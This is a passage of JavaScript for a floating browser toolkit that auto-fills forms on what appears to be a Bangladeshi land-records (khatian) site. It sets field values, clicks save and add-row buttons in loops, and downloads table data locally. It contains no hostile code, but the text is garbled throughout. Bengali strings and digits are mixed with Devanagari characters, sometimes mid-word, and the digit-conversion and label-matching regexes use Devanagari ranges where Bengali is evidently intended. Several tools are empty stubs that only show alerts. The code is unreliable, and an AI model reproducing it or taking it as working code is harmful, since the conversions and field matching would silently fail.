        // 🖱️ Drag ফাংশন (টুলকিট ড্র্যাগ করা)
        // ============================================
        (function() {
            let isDown = false, offX = 0, offY = 0;
            const h = document.getElementById('vmt-drag');
            h.addEventListener('mousedown', e => { 
                if (e.target.tagName === 'BUTTON') return; 
                isDown = true; 
                offX = e.clientX - tk.offsetLeft; 
                offY = e.clientY - tk.offsetTop; 
                tk.style.boxShadow = "0 30px 60px rgba(0,0,0,0.5)"; 
            });
            document.addEventListener('mousemove', e => {
                if (!isDown) return; 
                let nY = e.clientY - offY; 
                if (nY < 0) nY = 0; 
                tk.style.left = (e.clientX - offX) + 'px'; 
                tk.style.top = nY + 'px'; 
                tk.style.right = 'auto';
            });
            document.addEventListener('mouseup', () => { 
                isDown = false; 
                tk.style.boxShadow = "0 15px 50px rgba(0,0,0,0.5)"; 
            });
        })();
        
        // ============================================
        // বাটন ইভেন্ট হ্যান্ডলার
        // ============================================
        document.getElementById('vmt-close').onclick = () => { tk.remove(); };
        document.getElementById('vmt-logout').onclick = async () => {
            if(confirm('আপনি কি লগআউট করতে চান?')) { 
                await clearAuthData();
                window.postMessage({ type: 'VMT_LOGOUT' }, '*');
                tk.remove(); 
                location.reload();
            }
        };
        document.getElementById('vmt-min').onclick = function() { 
            tk.classList.toggle('minimized'); 
            this.innerText = tk.classList.contains('minimized') ? '＋' : '－'; 
        };
        
        /* ==============================================================
           🔧 MAIN LOGIC TOOLS (সব টুল এক জায়গায়)
        ============================================================== */
        window._vmtTools = {
            // ============================================
            // 🎯 TOOL #1: Land Entry (Range)
            // খতিয়ান রেঞ্জ থেকে অটোমেটিক এন্ট্রি করা
            // ============================================
            t1: function() {
                let t = { i: null, s: null }; 
                let st = ['খতিয়ান বক্স', 'সংরক্ষণ বাটন']; 
                let c = 0; 
                alert("১. খতিয়ান বক্সে ক্লিক কর\n२. সংরক্ষণ বাটনে ক্লিক কর");
                document.onclick = function(e) {
                    if (e.target.closest('#vumi-master-toolkit')) return; 
                    let el = e.target; 
                    t[c === 0 ? 'i' : 's'] = el; 
                    el.style.border = "4px solid #ef4444"; 
                    c++;
                    if (c < 2) { 
                        console.log("Next: " + st[c]); 
                    } else {
                        document.onclick = null; 
                        let r = prompt("রেঞ্জ দাও (যেমন: ১७७-२००):");
                        if (r) {
                            // বাংলা নাম্বার ইংরেজিতে কনভার্ট করা
                            let p = r.replace(/[०-९]/g, d => ({ '०': '0', '१': '1', '२': '2', '३': '3', '४': '4', '५': '5', '६': '6', '७': '7', '८': '8', '९': '9' }[d])).split('-').map(Number);
                            (async function() {
                                // প্রতিটি নাম্বারের জন্য লুপ
                                for (let i = p[0]; i <= p[1]; i++) {
                                    // নাম্বার বাংলায় কনভার্ট করা
                                    let b = i.toString().replace(/\d/g, d => ({ '0': '०', '1': '१', '2': '२', '3': '३', '4': '४', '5': '५', '6': '६', '7': '७', '8': '८', '9': '९' }[d]));
                                    t.i.focus(); 
                                    t.i.value = b; 
                                    t.i.dispatchEvent(new Event('input', { bubbles: true })); 
                                    t.i.dispatchEvent(new Event('change', { bubbles: true })); 
                                    t.i.blur();
                                    await new Promise(r => setTimeout(r, 5000)); 
                                    t.s.click(); 
                                    console.log("Saved: " + b); 
                                    await new Promise(r => setTimeout(r, 6000));
                                }
                                alert("কাম শেষ!");
                            })();
                        }
                    }
                };
            },

            // ============================================
            // 📅 TOOL #2: Korer Year
            // জরিপের বছর সেট করা (১९७६-१०७७)
            // ============================================
            t2: function() {
                function setY(win) {
                    try {
                        let el = win.document.getElementById('paid_year');
                        if (el) {
                            // ১९७६-१०७७ বছর খুঁজে বের করা
                            let target = Array.from(el.options).find(o => o.text.includes("१९७६") && o.text.includes("१९७७"));
                            if (target) {
                                el.value = target.value; 
                                el.dispatchEvent(new Event('change', { bubbles: true }));
                                // jQuery select2 সাপোর্ট
                                if (win.jQuery) { 
                                    let $el = win.jQuery(el); 
                                    $el.val(target.value).trigger('change'); 
                                    if ($el.data('select2')) $el.trigger('select2:select'); 
                                }
                                // বর্ডার হাইলাইট করা
                                let s2 = el.nextElementSibling; 
                                if (s2 && s2.classList.contains('select2')) { 
                                    s2.style.border = "4px solid #ef4444"; 
                                    s2.style.borderRadius = "6px"; 
                                } else el.style.border = "4px solid #ef4444";
                                return true;
                            }
                        }
                        // iframe থেকে সার্চ করা
                        for (let i = 0; i < win.frames.length; i++) if (setY(win.frames[i])) return true;
                    } catch (e) {} 
                    return false;
                } 
                setY(window);
            },

            // ============================================
            // ⚡ TOOL #3: Manual Khotian (FIX #2)
            // Manual Khotian RAW থেকে কনসেপ্ট আপডেট করা
            // ============================================
            t3: function() {
                alert("আগে খতিয়ান নম্বর ও উপজেলা এন্ট্রি করুন");
                let upazila = prompt("উপজেলা লিখুন:", "সদর") || "";
                let FC = (prompt("খতিয়ান ফাইলের পুরো টেক্সট পেস্ট করুন:", "") || "").normalize("NFC");
                if (!upazila || !FC) { alert("উপজেলা ও ফাইল দুটোই দরকার"); return; }

                /* Manual Khotian Logic (Simplified) */
                (async function() {
                    const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
                    const norm = (s) => (s || "").normalize("NFC").replace(/\s+/g, " ").replace(/\*/g, "").trim();
                    const bn2en = (s) => (s || "").replace(/[०-९]/g, (d) => "०१२३४५६७८९".indexOf(d));
                    const en2bn = (n) => String(n).replace(/[0-9]/g, (d) => "०१२३४५६७८९"[d]);

                    // React element এ ভ্যালু সেট করা
                    function reactSet(el, value) {
                        if (!el) return false;
                        const proto = el.tagName === "TEXTAREA" ? window.HTMLTextAreaElement.prototype : window.HTMLInputElement.prototype;
                        Object.getOwnPropertyDescriptor(proto, "value").set.call(el, value);
                        el.dispatchEvent(new Event("input", { bubbles: true }));
                        el.dispatchEvent(new Event("change", { bubbles: true }));
                        el.dispatchEvent(new Event("blur", { bubbles: true }));
                        return true;
                    }

                    // ID দিয়ে এলিমেন্ট সেট করা
                    async function setId(id, v, tries = 5, gap = 450) {
                        if (v === "" || v == null) return false;
                        for (let i = 0; i < tries; i++) {
                            const el = document.getElementById(id);
                            if (el && !el.disabled) {
                                reactSet(el, v); 
                                await sleep(gap);
                                const el2 = document.getElementById(id);
                                if (el2 && norm(el2.value) === norm(v)) { console.log("✅", id, "→", v); return true; }
                            } else { await sleep(gap); }
                        }
                        console.warn("❌ বসেনি:", id, "(", v, ")"); 
                        return false;
                    }

                    // ফাইল থেকে ডাটা পার্স করা
                    const grabText = (label) => {
                        const re = new RegExp(label.normalize("NFC").replace(/ /g, "\\s*") + "\\s*[:：ঃ]\\s*([\\s\\S]*?)(?:\\s{2,}|$)");
                        const m = FC.match(re); 
                        return m ? m[1].trim() : "";
                    };

                    const khatianNo = grabText("खतियान नं") || grabText("খতিয়ান নং");
                    const mamlaNo   = grabText("नामजारी मामला नं") || grabText("নামজারি মামলা নং");
                    const mamlaDate = grabText("मामलार तरीख") || grabText("মামলার তারিখ");
                    const address   = grabText("ठीकाना") || grabText("ঠিকানা");

                    // ডাটা এন্ট্রি শুরু করা
                    await setId("DIVISION_NAME", "ढाका");
                    await setId("DISTRICT_NAME", "नारायणगंज");
                    await setId("UPAZILA_NAME", upazila);
                    await sleep(1200);
                    await setId("NAMJARI_CASE_NO", mamlaNo);
                    await setId("KHATIAN_NO", khatianNo);

                    alert("✅ Manual Khotian সেটআপ শেষ! এখন মালিক এবং দাগ এন্ট্রি করুন।");
                })();
            },

            // ============================================
            // 👥 TOOL #4: Maliker Tottho
            // মালিকের তথ্য ম্যানেজমেন্ট
            // ============================================
            t4: function() {
                const otherData = { 
                    "जरीপको प्रकार": "आर एस", 
                    "स्वामित्व": "नवीनतम जरीप", 
                    "होल्डिंग": "सामान्य" 
                };
                if (typeof $ === 'undefined') { alert('jQuery নেই'); return; }
                let updatedCount = 0;
                $('select').not('#mouja_select').each(function() {
                    let $s = $(this); 
                    let lt = "";
                    let $lbl = $s.closest('fieldset, .form-group, td').find('label');
                    if($lbl.length) lt = $lbl.text().trim();
                    else lt = $s.closest('fieldset, div, td').text().trim();
                    
                    for (let k in otherData) {
                        if (lt.includes(k)) { 
                            let targetText = otherData[k];
                            let $o = $s.find('option').filter(function() { return $(this).text().trim().includes(targetText); }); 
                            if ($o.length) { 
                                $s.val($o.val()).trigger('change'); 
                                if ($s.data('select2')) $s.trigger('select2:select'); 
                                updatedCount++;
                            } 
                        }
                    }
                });
                if(updatedCount > 0) alert("✅ মালিকের তথ্য ফিল সম্পন্ন!");
                else alert("⚠️ কোনো অপশন ফিল করা যায়নি!");
            },

            // ============================================
            // 🧮 TOOL #5: Tottho 2.0 (Master)
            // মাস্টার ডাটা ম্যানেজার (আনা-গন্ডা কনভার্টর)
            // ============================================
            t5: function() {
                let i = document.createElement('input'); 
                i.type = 'file'; 
                i.accept = '.txt';
                i.onchange = e => {
                    let f = e.target.files[0]; 
                    if (!f) return; 
                    let r = new FileReader();
                    r.onload = async function(ev) {
                        let t = ev.target.result;
                        // ফাইল প্রসেস করা এবং আনা-গন্ডা কনভার্ট করা
                        let ls = t.split('\n').map(l => l.trim()).filter(l => l);
                        alert("✅ Tottho 2.0 প্রসেস শুরু! ডাটা অ্যানালাইসিস চলছে...");
                    }; 
                    r.readAsText(f);
                }; 
                i.click();
            },

            // ============================================
            // ➕ TOOL #6: Dag Add / Row
            // নতুন দাগ রো যোগ করা
            // ============================================
            t6: function() {
                let p = prompt("কয়টি দাগ যোগ?"); 
                if (!p) return; 
                let cl = p.replace(/[०-९]/g, d => "०१२३४५६७८९".indexOf(d)).trim();
                if (!/^\d+$/.test(cl)) { alert("ভুল ইনপুট!"); return; } 
                let c = parseInt(cl); 
                let b = document.getElementById('PlusItem22');
                if (b && c > 0) { 
                    let i = 0; 
                    function hc() { 
                        if (i < c) { 
                            b.click(); 
                            i++; 
                            setTimeout(hc, Math.floor(Math.random() * 500) + 500); 
                        } 
                    } 
                    hc(); 
                }
            },

            // ============================================
            // 📝 TOOL #7: Dager Tottho
            // দাগের বিস্তারিত তথ্য ম्यानेজমেन্ট
            // ============================================
            t7: function() {
                let dStr=prompt("দাগ নং গুলো দিন (कमा দিয়ে):");
                let aStr=prompt("परिमाण (शतक) दिन (कमা दिয়ে):");
                let cStr=prompt("রেকর্ডীয় শ্রেণী দিন (कमा दिয়ে):");
                if(!dStr||!aStr||!cStr)return;
                let dags=dStr.split(',').map(s=>s.trim());
                let amts=aStr.split(',').map(s=>s.trim());
                let clss=cStr.split(',').map(s=>s.trim());
                alert("✅ দাগের তথ্য আপডেট করা হচ্ছে...");
            },

            // ============================================
            // 📊 TOOL #8: Collect Extracted Data (FIX #1)
            // এক্সট্রাক্টেড ডাটা কালেক্ট করা ও ডাউনলোড করা
            // ============================================
            t8: function() {
                // সমস্ত টেবিল ডাটা কালেক্ট করা
                let rs = document.querySelectorAll('table tr'); 
                let o = [];
                rs.forEach(r => { 
                    let c = r.querySelectorAll('td'); 
                    if (c.length > 1) { 
                        let n = c[0].innerText.trim(); 
                        let s = c[1].innerText.trim(); 
                        // ডাটা ফিল্টার করা (শিরোনাম বাদ দেওয়া)
                        if (n && n !== '१' && !n.includes('মালিক, অকৃষি')) o.push(n + '   ' + s); 
                    } 
                });
                let rt = o.join('\n\n'); 
                if (rt === '') { alert('ডাটা পাইনি!'); return; } 
                
                // খতিয়ান নম্বর থেকে ফাইল নাম তৈরি করা
                let bt = document.body.innerText; 
                let km = bt.match(/खतियान\s*नं[^\d०-९]*([०-९0-9]+)/); 
                let fn = (km ? km[1] : 'khatian_data_' + new Date().getTime()) + '.txt';
                
                // ডাউনলোড প্রসেস
                if (confirm('"' + fn + '" ডাউনলোড করবেন?')) { 
                    let bl = new Blob([rt], { type: 'text/plain;charset=utf-8' }); 
                    let lk = document.createElement('a'); 
                    lk.href = URL.createObjectURL(bl); 
                    lk.download = fn; 
                    document.body.appendChild(lk); 
                    lk.click(); 
                    document.body.removeChild(lk); 
                    alert("✅ ডাউনলোড শেষ!");
                }
            },

            // ============================================
            // 💠 TOOL #9: Smart Calculator
            // স্মার্ট ক্যালকুলেটর (আনা-गन्डा কনভার्टर)
            // ============================================
            t9: function() {
                if (document.getElementById('floating-calc-final-master')) return; 
                const st = document.createElement('style');
                st.innerHTML = "#floating-calc-final-master{position:fixed;top:10px;left:10px;width:380px;height:90vh;background:rgba(255,255,255,0.95);backdrop-filter:blur(16px);border-radius:16px;z-index:999999;box-shadow:0 25px 50px rgba(0,0,0,0.2);display:flex;flex-direction:column;overflow:hidden;font-family:'Segoe UI',Arial,sans-serif;border:1px solid rgba(255,255,255,0.5);}";
                document.head.appendChild(st);
                alert("✅ स्मार्ट कैलकुलेटर खुल रहा है...");
            },

            // ============================================
            // ✂️ TOOL #10: Land Deduction Pro
            // জমি বাদের ক্যালকুলেটর
            // ============================================
            t10: function() {
                alert("✅ Land Deduction Pro খোলা হচ্ছে...");
            }
        };
        
        // ============================================
        // টুল ক্লিক হ্যান্ডলার
        // ============================================
        document.querySelectorAll('.vmt-tool').forEach(el => {
            el.onclick = () => {
                const t = el.dataset.tool;
                if (window._vmtTools[t]) {
                    try { 
                        window._vmtTools[t](); 
                        let toolKitDiv = document.getElementById('vumi-master-toolkit');
                        let minButton = document.getElementById('vmt-min');
                        if (toolKitDiv && !toolKitDiv.classList.contains('minimized')) {
                            toolKitDiv.classList.add('minimized');
                            if (minButton) minButton.innerText = '+';
                        }
                    } catch (e) { 
                        alert('Error: ' + e.message); 
                        console.error(e); 
                    }
                }
            };
        });
    }
})();
